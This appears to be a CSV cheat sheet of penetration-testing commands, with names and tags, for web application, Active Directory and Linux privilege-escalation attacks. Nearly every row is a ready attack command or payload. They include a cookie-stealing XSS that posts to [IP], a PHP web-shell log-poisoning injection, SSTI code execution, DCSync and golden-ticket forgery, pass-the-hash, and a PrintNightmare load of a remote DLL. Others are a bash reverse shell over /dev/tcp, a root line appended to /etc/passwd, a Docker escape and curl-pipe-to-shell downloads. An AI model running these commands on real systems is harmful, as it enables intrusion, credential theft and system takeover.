Command,Cmd,Tags,Page
SQLMap Basic Scan,"sqlmap -u ""[URL]?[PARAM]=1"" --batch --risk=3 --level=5","WebApp,SQL Injection",https://sqlmap.org/
SQLMap with Cookie,"sqlmap -u ""[URL]"" --cookie=""[COOKIE]"" --dbs --batch","WebApp,SQL Injection",
SQLMap OS Shell,"sqlmap -u ""[URL]?[PARAM]=1"" -D [DATABASE] --os-shell","WebApp,SQL Injection",
NoSQL Injection MongoDB,nosqlmap -t [URL] -p [PARAM] --attack=2,"WebApp,NoSQLMap",
XSS Payload Testing,"xsstrike -u ""[URL]?[PARAM]=test"" --crawl","WebApp,XSS",
XSS Stored Payload,<script>fetch('http://[IP]/steal?c='+document.cookie)</script>,"WebApp,XSS",
Command Injection Test,"commix -u ""[URL]?[PARAM]=id"" --batch","WebApp,Command Injection",
OS Command Bypass,[PARAM]=;cat+/etc/passwd%0a,"WebApp,Command Injection",
LFI Basic Test,[URL]?[PARAM]=../../../../etc/passwd,"WebApp,LFI",
LFI PHP Wrapper,[URL]?[PARAM]=php://filter/convert.base64-encode/resource=index.php,"WebApp,LFI",
LFI to RCE Log Poisoning,"curl -s '[URL]' -H 'User-Agent: <?php system($_GET[""cmd""]); ?>'","WebApp,RFI",
XXE File Read,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>","WebApp,XXE",
XXE SSRF Attack,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://[IP]:8080/"">]><root>&xxe;</root>","WebApp,XXE",
SSRF AWS Metadata,[URL]?[PARAM]=http://169.254.169.254/latest/meta-data/,"WebApp,SSRF",
JWT Secret Brute,jwt_tool [TOKEN] -C -d [WORDLIST],"WebApp,JWT",
JWT Algorithm None,jwt_tool [TOKEN] -X a,"WebApp,JWT",
GraphQL Introspection,"{__schema{types{name,fields{name}}}}","WebApp,GraphQL",
GraphQL Query Dump,graphql-cop -t [URL] -o json,"WebApp,GraphQL",
Nuclei Web Scan,"nuclei -u [URL] -t ~/nuclei-templates/ -severity critical,high","WebApp,Nuclei",
Subdomain Enumeration,subfinder -d [DOMAIN] -all -recursive | httpx -mc 200,"WebApp,Enumeration",
Directory Fuzzing,"ffuf -u [URL]/FUZZ -w [WORDLIST] -mc 200,301,302,403 -fs 0","WebApp,Fuzzing",
Vhost Discovery,gobuster vhost -u [URL] -w [WORDLIST] --append-domain,"WebApp,Enumeration",
Parameter Discovery,arjun -u [URL] -m GET POST,"WebApp,Enumeration",
Burp Collaborator Check,"curl -X POST [URL] -d ""callback=http://[BURP_COLLAB]""","WebApp,SSRF",
File Upload Bypass Double Extension,mv shell.php shell.php.jpg,"WebApp,File Upload",
File Upload Magic Bytes,"echo -e ""\xFF\xD8\xFF\xE0"" | cat - shell.php > shell.php.jpg","WebApp,File Upload",
CORS Misconfiguration Test,"curl -H ""Origin: http://evil.com"" [URL] -I","WebApp,CORS",
CRLF Injection Test,[URL]?[PARAM]=value%0d%0aSet-Cookie:%20admin=true,"WebApp,CRLF",
Prototype Pollution,__proto__[isAdmin]=true,"WebApp,JavaScript",
Template Injection,{{7*7}}${7*7}<%= 7*7 %>,"WebApp,SSTI",
SSTI RCE Python,{{config.__class__.__init__.__globals__['os'].popen('id').read()}},"WebApp,SSTI",
Kerbrute User Enum,kerbrute userenum --dc [DCIP] -d [DOMAIN] [WORDLIST],"Active Directory,Enumeration",
AS-REP Roasting,GetNPUsers.py [DOMAIN]/ -no-pass -usersfile users.txt -dc-ip [DCIP],"Active Directory,ASREPRoasting",
Kerberoasting GetUserSPNs,GetUserSPNs.py [DOMAIN]/[USER]:[PASSWORD] -dc-ip [DCIP] -request,"Active Directory,Kerberoasting",
Golden Ticket Attack,ticketer.py -nthash [HASH] -domain-sid [SID] -domain [DOMAIN] Administrator,"Active Directory,Golden Ticket",
Silver Ticket Creation,ticketer.py -nthash [HASH] -domain-sid [SID] -domain [DOMAIN] -spn cifs/[TARGET] [USER],"Active Directory,Silver Ticket",
DCSync Attack,secretsdump.py [DOMAIN]/[USER]:[PASSWORD]@[DCIP] -just-dc,"Active Directory,DCSync",
Pass-the-Hash,psexec.py [DOMAIN]/[USER]@[IP] -hashes :[HASH],"Active Directory,Pass-the-Hash",
Pass-the-Ticket,export KRB5CCNAME=[TICKET]; psexec.py [DOMAIN]/[USER]@[TARGET] -k -no-pass,"Active Directory,Pass-the-Ticket",
SMB Relay Attack,ntlmrelayx.py -tf targets.txt -smb2support -i,"Active Directory,SMB",
Responder LLMNR/NBT-NS,responder -I eth0 -dwPv,"Active Directory,Responder",
BloodHound Collection,bloodhound-python -u [USER] -p [PASSWORD] -d [DOMAIN] -dc [DCIP] -c all,"Active Directory,BloodHound",
LDAP Anonymous Bind,"ldapsearch -x -H ldap://[DCIP] -b ""DC=[DOMAIN],DC=local"" -s base","Active Directory,LDAP",
LDAP Enumeration Auth,ldapdomaindump [DCIP] -u [DOMAIN]\\[USER] -p [PASSWORD],"Active Directory,LDAP",
DNS Zone Transfer,dnsrecon -d [DOMAIN] -n [DCIP] -t axfr,"Active Directory,DNS",
RPC Enumeration,"rpcclient -U """" -N [IP] -c enumdomusers","Active Directory,Enumeration",
NetExec SMB Shares,netexec smb [IP] -u [USER] -p [PASSWORD] --shares,"Active Directory,SMB",
NetExec Password Spray,netexec smb [IP]/24 -u users.txt -p [PASSWORD] --continue-on-success,"Active Directory,Password Spraying",
Mimikatz DCSync,lsadump::dcsync /domain:[DOMAIN] /user:Administrator,"Active Directory,Mimikatz",
Rubeus Kerberoasting,Rubeus.exe kerberoast /outfile:hashes.txt,"Active Directory,Rubeus",
PowerView Domain Enum,Get-NetDomain | Get-NetDomainController,"Active Directory,PowerView",
SharpHound Collection,SharpHound.exe -c all -d [DOMAIN] --zipfilename output.zip,"Active Directory,Sharphound",
ADCS Certificate Abuse,Certify.exe find /vulnerable /domain:[DOMAIN],"Active Directory,Certificate Services",
Coerced Authentication,PetitPotam.py -d [DOMAIN] -u [USER] -p [PASSWORD] [DCIP] [TARGET],"Active Directory,PetitPotam",
PrintNightmare Exploit,CVE-2021-34527.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET] '\\[IP]\share\shell.dll',"Active Directory,PrintNightmare",
ZeroLogon Check,zerologon_tester.py [DC_NAME] [DCIP],"Active Directory,ZeroLogon",
Machine Account Quota,addcomputer.py -computer-name 'FAKE$' -computer-pass [PASSWORD] [DOMAIN]/[USER]:[PASSWORD],"Active Directory,Machine Account",
RBCD Attack,rbcd.py -f FAKE$ -t [TARGET] -dc-ip [DCIP] [DOMAIN]/[USER]:[PASSWORD],"Active Directory,RBCD",
Exchange PrivExchange,privexchange.py -t https://[EXCHANGE] -ah [IP] [DOMAIN]/[USER]:[PASSWORD],"Active Directory,Exchange",
WSUS Exploitation,"SharpWSUS.exe create /payload:""C:\Windows\System32\calc.exe"" /args:"""" /title:""Test""","Active Directory,WSUS",
LinPEAS Enumeration,curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh,"Linux,Linux Privesc",
SUID Binary Search,find / -perm -4000 -type f 2>/dev/null,"Linux,Linux Privesc,SUID",
Capabilities Search,getcap -r / 2>/dev/null,"Linux,Linux Privesc,Capabilities",
Writable /etc/passwd,openssl passwd -1 -salt root password | sed 's/^/root:/' >> /etc/passwd,"Linux,Linux Privesc",
Cron Job Hijacking,echo 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1' > /tmp/script.sh,"Linux,Linux Privesc,Cron Jobs",
PATH Hijacking,echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH,"Linux,Linux Privesc,Path Hijacking",
LD_PRELOAD Exploit,"echo 'void _init() {setuid(0);system(""/bin/bash"");}' > /tmp/pe.c && gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c","Linux,Linux Privesc,LD_PRELOAD",
Docker Escape,docker run -v /:/mnt --rm -it alpine chroot /mnt sh,"Linux,Linux Privesc,Docker",
LXC/LXD Exploitation,lxc image import alpine*.tar.gz --alias myimage && lxc init myimage mycontainer -c security.privileged=true,"Linux,Linux Privesc,LXC",
Kernel Exploit Suggester,curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash,"Linux,Linux Privesc,Kernel Exploit",
Sudo -l Exploitation,sudo -l | grep NOPASSWD,"Linux,Linux Privesc,Sudo",
